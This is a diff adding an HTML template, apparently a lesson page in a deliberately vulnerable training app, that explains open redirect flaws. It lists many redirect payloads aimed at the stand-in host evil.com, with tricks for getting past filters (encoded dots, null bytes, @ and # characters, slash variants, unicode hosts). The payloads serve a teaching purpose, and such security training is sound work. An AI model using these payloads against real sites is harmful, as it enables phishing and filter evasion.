@@ -1,0 +1,206 @@
+{% extends 'vuln10.html' %} {% block body %}
+<style>
+  body,
+  h1,
+  h2,
+  p,
+  ol,
+  li,
+  pre,
+  code {
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: Arial, sans-serif;
+    line-height: 1.6;
+  }
+
+  article {
+    max-width: 800px;
+    margin: 0 auto;
+  }
+
+  h1 {
+    font-size: 2em;
+    margin-bottom: 20px;
+  }
+
+  h2 {
+    font-size: 1.5em;
+    margin-top: 20px;
+    margin-bottom: 10px;
+  }
+
+  section {
+    margin-bottom: 20px;
+  }
+
+  pre {
+    background-color: #f8f8f8;
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+  }
+
+  code {
+    font-family: Consolas, monospace;
+  }
+
+  /* Style Markdown code blocks */
+  pre code {
+    display: block;
+    padding: 10px;
+    background-color: #f0f0f0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    overflow-x: auto;
+  }
+  .container {
+    width: 90%;
+    margin: auto;
+    padding: 20px;
+    background-color: #fff;
+    box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    border-radius: 10px;
+    margin-top: 30px;
+  }
+  .scrollable-content {
+    height: 450px; /* Adjust the height as needed */
+    overflow-y: auto;
+    padding-right: 20px;
+  }
+</style>
+<div class="container">
+  <h1>Open Redirect</h1>
+  <div class="scrollable-content">
+    <h2>Introduction</h2>
+    <p>
+      Open redirection vulnerabilities arise when an application incorporates
+      user-controllable data into the target of a redirection in an unsafe way.
+      An attacker can construct a URL within the application that causes a
+      redirection to an arbitrary external domain.
+    </p>
+
+    <h2>Where to find</h2>
+    <ul>
+      <li>Sometimes it can be found in login / register / logout pages</li>
+      <li>Checking the JavaScript source code</li>
+    </ul>
+
+    <h2>How to exploit</h2>
+    <ol>
+      <li>
+        <p>Try change the domain</p>
+        <pre><code>/?redir=evil.com</code></pre>
+      </li>
+      <li>
+        <p>Using a whitelisted domain or keyword</p>
+        <pre><code>/?redir=target.com.evil.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Using <code>//</code> to bypass <code>http</code> blacklisted keyword
+        </p>
+        <pre><code>/?redir=//evil.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Using <code>https:</code> to bypass <code>//</code> blacklisted
+          keyword
+        </p>
+        <pre><code>/?redir=https:evil.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Using <code>\\</code> to bypass <code>//</code> blacklisted keyword
+        </p>
+        <pre><code>/?redir=\\evil.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Using <code>\/\/</code> to bypass <code>//</code> blacklisted keyword
+        </p>
+        <pre><code>/?redir=\/\/evil.com/</code></pre>
+        <pre><code>/?redir=/\/evil.com/</code></pre>
+      </li>
+      <li>
+        <p>
+          Using <code>%E3%80%82</code> to bypass <code>.</code> blacklisted
+          character
+        </p>
+        <pre><code>/?redir=evil。com</code></pre>
+        <pre><code>/?redir=evil%E3%80%82com</code></pre>
+      </li>
+      <li>
+        <p>Using null byte <code>%00</code> to bypass blacklist filter</p>
+        <pre><code>/?redir=//evil%00.com</code></pre>
+      </li>
+      <li>
+        <p>Using parameter pollution</p>
+        <pre><code>/?next=target.com&next=evil.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Using <code>@</code> or <code>%40</code> character, browser will
+          redirect to anything after the <code>@</code>
+        </p>
+        <pre><code>/?redir=target.com@evil.com</code></pre>
+        <pre><code>/?redir=target.com%40evil.com</code></pre>
+      </li>
+      <li>
+        <p>Creating folder as their domain</p>
+        <pre><code>http://www.yoursite.com/http://www.theirsite.com/</code></pre>
+        <pre><code>http://www.yoursite.com/folder/www.folder.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Using <code>?</code> character, browser will translate it to
+          <code>/?</code>
+        </p>
+        <pre><code>/?redir=target.com?evil.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Bypass the filter if it only checks for domain name using
+          <code>%23</code>
+        </p>
+        <pre><code>/?redir=target.com%23evil.com</code></pre>
+      </li>
+      <li>
+        <p>Host/Split Unicode Normalization</p>
+        <pre><code>https://evil.c℀.example.com</code></pre>
+      </li>
+      <li>
+        <p>Using parsing</p>
+        <pre><code>http://ⓔⓥⓘⓛ.ⓒⓞⓜ</code></pre>
+      </li>
+      <li>
+        <p>Using <code>°</code> symbol to bypass</p>
+        <pre><code>/?redir=target.com/°evil.com</code></pre>
+      </li>
+      <li>
+        <p>
+          Bypass the filter if it only allows you to control the path using a
+          nullbyte <code>%0d</code> or <code>%0a</code>
+        </p>
+        <pre><code>/?redir=/%0d/evil.com</code></pre>
+      </li>
+    </ol>
+
+    <h2>References</h2>
+    <ul>
+      <li>
+        <a href="https://hackerone.com/reports/1250758">Hackerone #1250758</a>
+      </li>
+      <li>
+        <a
+          href="https://medium.com/@ahmadbrainworks/bug-bounty-how-i-earned-550-in-less-than-5-minutes-open-redirect-chained-with-rxss-8957979070e5"
+          >@ahmadbrainworks article</a
+        >
+      </li>
+    </ul>
+  </div>
+</div>
+{% endblock %}
